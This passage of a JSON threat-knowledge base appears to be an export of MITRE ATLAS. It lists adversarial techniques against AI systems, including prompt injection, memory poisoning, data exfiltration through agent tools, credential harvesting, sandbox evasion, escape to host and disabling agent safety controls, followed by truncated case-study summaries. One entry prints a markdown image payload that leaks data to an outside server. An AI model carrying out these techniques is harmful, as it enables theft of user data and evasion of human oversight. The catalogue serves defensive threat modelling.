      "name": "Corrupt AI Model",
      "description": "An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0077",
      "name": "LLM Response Rendering",
      "description": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. \n\nThe adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown\n\nFor example, an LLM may produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0008.004",
      "name": "Serverless",
      "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers. This can be used to bypass a Content Security Policy which prevent retrieving content from arbitrary locations.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0078",
      "name": "Drive-by Compromise",
      "description": "Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model.\n\nThe same approach may be used to deliver other types of malicious code that don't target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0079",
      "name": "Stage Capabilities",
      "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017)) or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008)) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.\n\nAdversaries may stage a variety of AI Artifacts including poisoned datasets ([Publish Poisoned Datasets](/techniques/AML.T0019), malicious models ([Publish Poisoned Models](/techniques/AML.T0058), and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0080",
      "name": "AI Agent Context Poisoning",
      "description": "Adversaries may attempt to manipulate the context used by an AI agent's large language model (LLM) to influence the responses it generates or actions it takes. This allows an adversary to persistently change the behavior of the target agent and further their goals.\n\nContext poisoning can be accomplished by prompting the an LLM to add instructions or preferences to memory (See [Memory](/techniques/AML.T0080.000)) or by simply prompting an LLM that uses prior messages in a thread as part of its context (See [Thread](/techniques/AML.T0080.001)).",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0080.000",
      "name": "Memory",
      "description": "Adversaries may manipulate the memory of a large language model (LLM) in order to persist changes to the LLM to future chat sessions. \n\nMemory is a common feature in LLMs that allows them to remember information across chat sessions by utilizing a user-specific database. Because the memory is controlled via normal conversations with the user (e.g. \"remember my preference for ...\") an adversary can inject memories via Direct or Indirect Prompt Injection. Memories may contain malicious instructions (e.g. instructions that leak private conversations) or may promote the adversary's hidden agenda (e.g. manipulating the user).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0080.001",
      "name": "Thread",
      "description": "Adversaries may introduce malicious instructions into a chat thread of a large language model (LLM) to cause behavior changes which persist for the remainder of the thread. A chat thread may continue for an extended period over multiple sessions.\n\nThe malicious instructions may be introduced via Direct or Indirect Prompt Injection. Direct Injection may occur in cases where the adversary has acquired a user's LLM API keys and can inject queries directly into any thread.\n\nAs the token limits for LLMs rise, AI systems can make use of larger context windows which allow malicious instructions to persist longer in a thread.\nThread Poisoning may affect multiple users if the LLM is being used in a service with shared threads. For example, if an agent is active in a Slack channel with multiple participants, a single malicious message from one user can influence the agent's behavior in future interactions with others.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0081",
      "name": "Modify AI Agent Configuration",
      "description": "Adversaries may modify the configuration files for AI agents on a system. This allows malicious changes to persist beyond the life of a single agent and affects any agents that share the configuration.\n\nConfiguration changes may include modifications to the system prompt, tampering with or replacing knowledge sources, modification to settings of connected tools, and more. Through those changes, an attacker could redirect outputs or tools to malicious services, embed covert instructions that exfiltrate data, or weaken security controls that normally restrict agent behavior.\n\nAdversaries may modify or disable a configuration setting related to security controls, such as those that would prevent the AI Agent from taking actions that may be harmful to the user's system without human-in-the-loop oversight. Disabling AI agent security features may allow adversaries to achieve their malicious goals and maintain long-term corruption of the AI agent.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0082",
      "name": "RAG Credential Harvesting",
      "description": "Adversaries may attempt to use their access to a large language model (LLM) on the victim's system to collect credentials. Credentials may be stored in internal documents which can inadvertently be ingested into a RAG database, where they can ultimately be retrieved by an AI agent.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0083",
      "name": "Credentials from AI Agent Configuration",
      "description": "Adversaries may access the credentials of other tools or services on a system from the configuration of an AI agent.\n\nAI Agents often utilize external tools or services to take actions, such as querying databases, invoking APIs, or interacting with cloud resources. To enable these functions, credentials like API keys, tokens, and connection strings are frequently stored in configuration files. While there are secure methods such as dedicated secret managers or encrypted vaults that can be deployed to store and manage these credentials, in practice they are often placed in less protected locations for convenience or ease of deployment. If an attacker can read or extract these configurations, they may obtain valid credentials that allow direct access to sensitive systems outside the agent itself.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0084",
      "name": "Discover AI Agent Configuration",
      "description": "Adversaries may attempt to discover configuration information for AI agents present on the victim's system. Agent configurations can include tools or services they have access to.\n\nAdversaries may directly access agent configuring dashboards or configuration files. They may also obtain configuration details by prompting the agent with questions such as \"What tools do you have access to?\"\n\nAdversaries can use the information they discover about AI agents to help with targeting.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0084.000",
      "name": "Embedded Knowledge",
      "description": "Adversaries may attempt to discover the data sources a particular agent can access.  The AI agent's configuration may reveal data sources or knowledge.\n\nThe embedded knowledge may include sensitive or proprietary material such as intellectual property, customer data, internal policies, or even credentials. By mapping what knowledge an agent has access to, an adversary can better understand the AI agent's role and potentially expose confidential information or pinpoint high-value targets for further exploitation.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0084.001",
      "name": "Tool Definitions",
      "description": "Adversaries may discover the tools the AI agent has access to. By identifying which tools are available, the adversary can understand what actions may be executed through the agent and what additional resources it can reach. This knowledge may reveal access to external data sources such as OneDrive or SharePoint, or expose exfiltration paths like the ability to send emails, helping adversaries identify AI agents that provide the greatest value or opportunity for attack.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0084.002",
      "name": "Activation Triggers",
      "description": "Adversaries may discover keywords or other triggers (such as incoming emails, documents being added, incoming message, or other workflows) that activate an agent and may cause it to run additional actions.\n\nUnderstanding these triggers can reveal how the AI agent is activated and controlled. This may also expose additional paths for compromise, as an adversary could attempt to trigger the agent from outside its environment and drive it to perform unintended or malicious actions.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0085",
      "name": "Data from AI Services",
      "description": "Adversaries may use their access to a victim organization's AI-enabled services to collect proprietary or otherwise sensitive information. As organizations adopt generative AI in centralized services for accessing an organization's data, such as with chat agents which can access retrieval augmented generation (RAG) databases and other data sources via tools, they become increasingly valuable targets for adversaries.\n\nAI agents may be configured to have access to tools and data sources that are not directly accessible by users. Adversaries may abuse this to collect data that a regular user wouldn't be able to access directly.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0085.000",
      "name": "RAG Databases",
      "description": "Adversaries may prompt the AI service to retrieve data from a RAG database. This can include the majority of an organization's internal documents.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0085.001",
      "name": "AI Agent Tools",
      "description": "Adversaries may prompt the AI service to invoke various tools the agent has access to. Tools may retrieve data from different APIs or services in an organization.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0086",
      "name": "Exfiltration via AI Agent Tool Invocation",
      "description": "Adversaries may use prompts to invoke an agent's tool capable of performing write operations to exfiltrate data. Sensitive information can be encoded into the tool's input parameters and transmitted as part of a seemingly legitimate action. Variants include sending emails, creating or modifying documents, updating CRM records, or even generating media such as images or videos.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0087",
      "name": "Gather Victim Identity Information",
      "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, photos, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation, [Search Victim-Owned Websites](/techniques/AML.T0003), or via leaked information on the black market.\n\nAdversaries may use the gathered victim data to Create Deepfakes and impersonate them in a convincing manner. This may create opportunities for adversaries to [Establish Accounts](/techniques/AML.T0021) under the impersonated identity, or allow them to perform convincing [Phishing](/techniques/AML.T0052) attacks.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0088",
      "name": "Generate Deepfakes",
      "description": "Adversaries may use generative artificial intelligence (GenAI) to create synthetic media (i.e. imagery, video, audio, and text) that appear authentic. These \"[deepfakes]( https://en.wikipedia.org/wiki/Deepfake)\" may mimic a real person or depict fictional personas. Adversaries may use deepfakes for impersonation to conduct [Phishing](/techniques/AML.T0052) or to evade AI applications such as biometric identity verification systems (see [Evade AI Model](/techniques/AML.T0015)).\n\nManipulation of media has been possible for a long time, however GenAI reduces the skill and level of effort required, allowing adversaries to rapidly scale operations to target more users or systems. It also makes real-time manipulations feasible.\n\nAdversaries may utilize open-source models and software that were designed for legitimate use cases to generate deepfakes for malicious use. However, there are some projects specifically tailored towards malicious use cases such as [ProKYC](https://www.catonetworks.com/blog/prokyc-selling-deepfake-tool-for-account-fraud-attacks/).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0089",
      "name": "Process Discovery",
      "description": "Adversaries may attempt to get information about processes running on a system. Once obtained, this information could be used to gain an understanding of common AI-related software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details.\n\nIdentifying the AI software stack can then lead an adversary to new targets and attack pathways. AI-related software may require application tokens to authenticate with backend services. This provides opportunities for [Credential Access](/tactics/AML.TA0013) and [Lateral Movement](/tactics/AML.TA0015).\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or `Get-Process` via PowerShell. Information about processes can also be extracted from the output of Native API calls such as `CreateToolhelp32Snapshot`. In Mac and Linux, this is accomplished with the `ps` command. Adversaries may also opt to enumerate processes via `/proc`.",
      "tactic": "",
      "type": "technique",
      "severity": "medium"
    },
    {
      "id": "AML.T0090",
      "name": "OS Credential Dumping",
      "description": "Adversaries may extract credentials from OS caches, application memory, or other sources on a compromised system. Credentials are often in the form of a hash or clear text, and can include usernames and passwords, application tokens, or other authentication keys.\n\nCredentials can be used to perform [Lateral Movement](/tactics/AML.TA0015) to access other AI services such as AI agents, LLMs, or AI inference APIs. Credentials could also give an adversary access to other software tools and data sources that are part of the AI DevOps lifecycle.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0091",
      "name": "Use Alternate Authentication Material",
      "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.\n\nAI services commonly use alternate authentication material as a primary means for users to make queries, making them vulnerable to this technique.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0092",
      "name": "Manipulate User LLM Chat History",
      "description": "Adversaries may manipulate a user's large language model (LLM) chat history to cover the tracks of their malicious behavior. They may hide persistent changes they have made to the LLM's behavior, or obscure their attempts at discovering private information about the user.\n\nTo do so, adversaries may delete or edit existing messages or create new threads as part of their coverup. This is feasible if the adversary has the victim's authentication tokens for the backend LLM service or if they have direct access to the victim's chat interface. \n\nChat interfaces (especially desktop interfaces) often do not show the injected prompt for any ongoing chat, as they update chat history only once when initially opening it. This can help the adversary's manipulations go unnoticed by the victim.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0091.000",
      "name": "Application Access Token",
      "description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, software-as-a-service (SaaS), and AI-as-a-service(AIaaS). They are commonly used for AI services such as chatbots, LLMs, and predictive inference APIs.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0093",
      "name": "Prompt Infiltration via Public-Facing Application",
      "description": "An adversary may introduce malicious prompts into the victim's system via a public-facing application with the intention of it being ingested by an AI at some point in the future and ultimately having a downstream effect. This may occur when a data source is indexed by a retrieval augmented generation (RAG) system, when a rule triggers an action by an AI agent, or when a user utilizes a large language model (LLM) to interact with the malicious content. The malicious prompts may persist on the victim system for an extended period and could affect multiple users and various AI tools within the victim organization.\n\nAny public-facing application that accepts text input could be a target. This includes email, shared document systems like OneDrive or Google Drive, and service desks or ticketing systems like Jira. This also includes OCR-mediated infiltration where malicious instructions are embedded in images, screenshots, and invoices that are ingested into the system.\n\nAdversaries may perform [Reconnaissance](/tactics/AML.TA0002) to identify public facing applications that are likely monitored by an AI agent or are likely to be indexed by a RAG. They may perform [Discover AI Agent Configuration](/techniques/AML.T0084) to refine their targeting.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0094",
      "name": "Delay Execution of LLM Instructions",
      "description": "Adversaries may include instructions to be followed by the AI system in response to a future event, such as a specific keyword or the next interaction, in order to evade detection or bypass controls placed on the AI system.\n\nFor example, an adversary may include \"If the user submits a new request...\" followed by the malicious instructions as part of their prompt.\n\nAI agents can include security measures against prompt injections that prevent the invocation of particular tools or access to certain data sources during a conversation turn that has untrusted data in context. Delaying the execution of instructions to a future interaction or keyword is one way adversaries may bypass this type of control.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0051.002",
      "name": "Triggered",
      "description": "An adversary may trigger a prompt injection via a user action or event that occurs within the victim's environment. Triggered prompt injections often target AI agents, which can be activated by means the adversary identifies during [Discovery](/tactics/AML.TA0008) (See [Activation Triggers](/techniques/AML.T0084.002)). These malicious prompts may be hidden or obfuscated from the user and may already exist somewhere in the victim's environment from the adversary performing [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093). This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0095",
      "name": "Search Open Websites/Domains",
      "description": "Adversaries may search public websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or domains owned by the victim.\n\nAdversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0096",
      "name": "AI Service API",
      "description": "Adversaries may communicate using the API of an AI service on the victim's system. The adversary's commands to the victim system, and often the results, are embedded in the normal traffic of the AI service.\n\nAn AI service API command and control channel is covert because the adversary's commands blend in with normal communications, so an adversary may use this technique to avoid detection. Using existing infrastructure on the victim's system allows the adversary to live off the land, further reducing their footprint.\n\nAI service APIs may be abused as C2 channels when an adversary wants to be stealthy and maintain long-term persistence for espionage activities [\\[1\\]][1].\n\n[1]: https://www.microsoft.com/en-us/security/blog/2025/11/03/sesameop-novel-backdoor-uses-openai-assistants-api-for-command-and-control/",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0097",
      "name": "Virtualization/Sandbox Evasion",
      "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads.\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization such as registry keys (e.g. substrings matching Vmware, VBOX, QEMU), environment variables (e.g. substrings matching VBOX, VMWARE, PARALLELS), NIC MAC addresses (e.g. prefixes 00-05-69 (VMWare) or 08-00-27 (VirtualBox)), running processes (e.g. vmware.exe, vboxservice.exe, qemu-ga.exe) [\\[1\\]][1].\n\n[1]: https://research.checkpoint.com/2025/ai-evasion-prompt-injection/",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0098",
      "name": "AI Agent Tool Credential Harvesting",
      "description": "Adversaries may attempt to use their access to an AI agent on the victim's system to retrieve data from available agent tools to collect credentials. Agent tools may connect to a wide range of sources that may contain credentials including document stores (e.g. SharePoint, OneDrive or Google Drive), code repositories (e.g. GitHub or GitLab), or enterprise productivity tools (e.g. as email providers or Slack), and local notetaking tools (e.g. Obsidian or Apple Notes).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0099",
      "name": "AI Agent Tool Data Poisoning",
      "description": "Adversaries may place malicious content on a victim's system where it can be retrieved by an AI Agent Tool. This may be accomplished by placing documents in a location that will be ingested by a service the AI agent has associated tools for.\n\nThe content may be targeted such that it would often be retrieved by common queries. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0100",
      "name": "AI Agent Clickbait",
      "description": "Adversaries may craft deceptive web content designed to bait Computer-Using AI agents or AI web browsers into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, or prompt-like language embedded in the site. When successful, they can lead the agent to inadvertently copy and execute malicious code on the user's operating system.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0101",
      "name": "Data Destruction via AI Agent Tool Invocation",
      "description": "Adversaries may invoke an AI agent's tool capable of performing mutative operations to perform Data Destruction. Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0102",
      "name": "Generate Malicious Commands",
      "description": "Adversaries may use large language models (LLMs) to dynamically generate malicious commands from natural language. Dynamically generated commands may be harder detect as the attack signature is constantly changing. AI-generated commands may also allow adversaries to more rapidly adapt to different environments and adjust their tactics.\n\nAdversaries may utilize LLMs present in the victim's environment or call out to externally hosted services. [APT28](https://attack.mitre.org/groups/G0007) utilized a model hosted on HuggingFace in a campaign with their LAMEHUG malware [\\[1\\]][1]. In either case prompts to generate malicious code can blend in with normal traffic.\n\n[1]: https://logpoint.com/en/blog/apt28s-new-arsenal-lamehug-the-first-ai-powered-malware",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0103",
      "name": "Deploy AI Agent",
      "description": "Adversaries may launch AI agents in the victim's environment to execute actions on their behalf. AI agents may have access to a wide range of tools and data sources, as well as permissions to access and interact with other services and systems in the victim's environment. The adversary may leverage these capabilities to carry out their operations.\n\nAdversaries may configure the AI agent by providing an initial system prompt and granting access to tools, effectively defining their goals for the agent to achieve. They may deploy the agent with excessive trust permissions and disable any user interactions to ensure the agent's actions aren't blocked.\n\nLaunching an AI agent may provide for some autonomous behavior, allowing for the agent to make decisions and determine how to achieve the adversary's goals. This also represents a loss of control for the adversary.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0104",
      "name": "Publish Poisoned AI Agent Tool",
      "description": "Adversaries may create and publish poisoned AI agent tools. Poisoned tools may contain an [LLM Prompt Injection](/techniques/AML.T0051), which can lead to a variety of impacts.\n\nTools may be published to open source version control repositories (e.g. GitHub, GitLab), to package registries (e.g. npm), or to repositories specifically designed for sharing tools (e.g. OpenClaw Hub). These registries may be largely unregulated and may contain many poisoned tools [\\[1\\]][1].\n\n[1]: https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0011.002",
      "name": "Poisoned AI Agent Tool",
      "description": "A victim may invoke a poisoned tool when interacting with their AI agent. A poisoned tool may execute an [LLM Prompt Injection](/techniques/AML.T0051) or perform [AI Agent Tool Invocation](/techniques/AML.T0053).\n\nPoisoned AI agent tools may be introduced into the victim's environment via [AI Software](/techniques/AML.T0010.001), or the user may configure their agent to connect to remote tools.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0011.003",
      "name": "Malicious Link",
      "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.\n\nThere are many ways an adversary can leverage malicious links to gain access to a victim system via an AI system. For example, an AI Agent that is configured to not validate website origin headers will accept connections from any website, allowing adversaries the ability to get around previously inaccessible network.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0105",
      "name": "Escape to Host",
      "description": "Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.\n\nThere are many ways an adversary may escape from a container or sandbox environment via AI Systems. For example, modifying an AI Agent's configuration to disable safety features or user confirmations could allow the adversary to invoke tools to be run on host environments rather than in the sandbox.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0106",
      "name": "Exploitation for Credential Access",
      "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0107",
      "name": "Exploitation for Defense Evasion",
      "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0108",
      "name": "AI Agent",
      "description": "Adversaries may abuse AI agents present on the victim's system for command and control. AI agents are often granted access to tools that can execute shell commands, reach out to the internet, and interact with other services in the victim's environment, making them capable C2 agents.\n\nThe adversary may modify the behavior of an AI agent for C2 via [LLM Prompt Injection](/techniques/AML.T0051) and rely on the agent's ability to invoke tools to retrieve and execute the adversary's commands. They may maintain persistent control of an agent via [Modify AI Agent Configuration](/techniques/AML.T0081) or [AI Agent Context Poisoning](/techniques/AML.T0080). They may instruct the agent to not report their actions to the user in an attempt to remain covert.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    }
  ],
  "caseStudies": [
    {
      "id": "AML.CS0000",
      "name": "Evasion of Deep Learning Detector for Malware C&C Traffic",
      "summary": "The Palo Alto Networks Security AI research team tested a deep learning model for malware command and control (C&C) traffic detection in HTTP traffic.\nBased on the publicly available [paper by Le et a...",
      "techniques": []
    },
    {
      "id": "AML.CS0001",
      "name": "Botnet Domain Generation Algorithm (DGA) Detection Evasion",
      "summary": "The Palo Alto Networks Security AI research team was able to bypass a Convolutional Neural Network based botnet Domain Generation Algorithm (DGA) detector using a generic domain name mutation techniqu...",
      "techniques": []
    },
    {
      "id": "AML.CS0002",
      "name": "VirusTotal Poisoning",
      "summary": "McAfee Advanced Threat Research noticed an increase in reports of a certain ransomware family that was out of the ordinary. Case investigation revealed that many samples of that particular ransomware ...",
      "techniques": []
    },
    {
      "id": "AML.CS0003",
      "name": "Bypassing Cylance's AI Malware Detection",
      "summary": "Researchers at Skylight were able to create a universal bypass string that evades detection by Cylance's AI Malware detector when appended to a malicious file.",
      "techniques": []
    },
    {
      "id": "AML.CS0004",
      "name": "Camera Hijack Attack on Facial Recognition System",
      "summary": "This type of camera hijack attack can evade the traditional live facial recognition authentication model and enable access to privileged systems and victim impersonation.\n\nTwo individuals in China use...",
      "techniques": []
    },
    {
      "id": "AML.CS0005",
      "name": "Attack on Machine Translation Services",
      "summary": "Machine translation services (such as Google Translate, Bing Translator, and Systran Translate) provide public-facing UIs and APIs.\nA research group at UC Berkeley utilized these public endpoints to c...",
      "techniques": []
    },
    {
      "id": "AML.CS0006",
      "name": "ClearviewAI Misconfiguration",
      "summary": "Clearview AI makes a facial recognition tool that searches publicly available photos for matches.  This tool has been used for investigative purposes by law enforcement agencies and other parties.\n\nCl...",
      "techniques": []
    },
    {
      "id": "AML.CS0007",
      "name": "GPT-2 Model Replication",
      "summary": "OpenAI built GPT-2, a language model capable of generating high quality text samples. Over concerns that GPT-2 could be used for malicious purposes such as impersonating others, or generating misleadi...",
      "techniques": []
    },
    {
      "id": "AML.CS0008",
      "name": "ProofPoint Evasion",
      "summary": "Proof Pudding (CVE-2019-20634) is a code repository that describes how ML researchers evaded ProofPoint's email protection system by first building a copy-cat email protection ML model, and using the ...",
      "techniques": []
    },
    {
      "id": "AML.CS0009",
      "name": "Tay Poisoning",
      "summary": "Microsoft created Tay, a Twitter chatbot designed to engage and entertain users.\nWhile previous chatbots used pre-programmed scripts\nto respond to prompts, Tay's machine learning capabilities allowed ...",
      "techniques": []
    },
    {
      "id": "AML.CS0010",
      "name": "Microsoft Azure Service Disruption",
      "summary": "The Microsoft AI Red Team performed a red team exercise on an internal Azure service with the intention of disrupting its service. This operation had a combination of traditional ATT&CK enterprise tec...",
      "techniques": []
    },
    {
      "id": "AML.CS0011",
      "name": "Microsoft Edge AI Evasion",
      "summary": "The Azure Red Team performed a red team exercise on a new Microsoft product designed for running AI workloads at the edge. This exercise was meant to use an automated system to continuously manipulate...",
      "techniques": []
    },
    {
      "id": "AML.CS0012",
      "name": "Face Identification System Evasion via Physical Countermeasures",
      "summary": "MITRE's AI Red Team demonstrated a physical-domain evasion attack on a commercial face identification service with the intention of inducing a targeted misclassification.\nThis operation had a combinat...",
      "techniques": []
    },
    {
      "id": "AML.CS0013",
      "name": "Backdoor Attack on Deep Learning Models in Mobile Apps",
      "summary": "Deep learning models are increasingly used in mobile applications as critical components.\nResearchers from Microsoft Research demonstrated that many deep learning models deployed in mobile apps are vu...",
      "techniques": []
    },
    {
      "id": "AML.CS0014",
      "name": "Confusing Antimalware Neural Networks",
      "summary": "Cloud storage and computations have become popular platforms for deploying ML malware detectors.\nIn such cases, the features for models are built on users' systems and then sent to cybersecurity compa...",
      "techniques": []
    },
    {
      "id": "AML.CS0015",
      "name": "Compromised PyTorch Dependency Chain",
      "summary": "Linux packages for PyTorch's pre-release version, called Pytorch-nightly, were compromised from December 25 to 30, 2022 by a malicious binary uploaded to the Python Package Index (PyPI) code repositor...",
      "techniques": []
    },
    {
      "id": "AML.CS0016",
      "name": "Achieving Code Execution in MathGPT via Prompt Injection",
      "summary": "The publicly available Streamlit application [MathGPT](https://mathgpt.streamlit.app/) uses GPT-3, a large language model (LLM), to answer user-generated math questions.\n\nRecent studies and experiment...",
      "techniques": []
    },
    {
      "id": "AML.CS0017",
      "name": "Bypassing ID.me Identity Verification",
      "summary": "An individual filed at least 180 false unemployment claims in the state of California from October 2020 to December 2021 by bypassing ID.me's automated identity verification system. Dozens of fraudule...",
      "techniques": []
    },
    {
      "id": "AML.CS0018",
      "name": "Arbitrary Code Execution with Google Colab",
      "summary": "Google Colab is a Jupyter Notebook service that executes on virtual machines.  Jupyter Notebooks are often used for ML and data science research and experimentation, containing executable snippets of ...",
      "techniques": []
    },
    {
      "id": "AML.CS0019",
      "name": "PoisonGPT",
      "summary": "Researchers from Mithril Security demonstrated how to poison an open-source pre-trained large language model (LLM) to return a false fact. They then successfully uploaded the poisoned model back to Hu...",
      "techniques": []
    },
    {
      "id": "AML.CS0020",
      "name": "Indirect Prompt Injection Threats: Bing Chat Data Pirate",
      "summary": "Whenever interacting with Microsoft's new Bing Chat LLM Chatbot, a user can allow Bing Chat permission to view and access currently open websites throughout the chat session. Researchers demonstrated ...",
      "techniques": []
    },
    {
      "id": "AML.CS0021",
      "name": "ChatGPT Conversation Exfiltration",
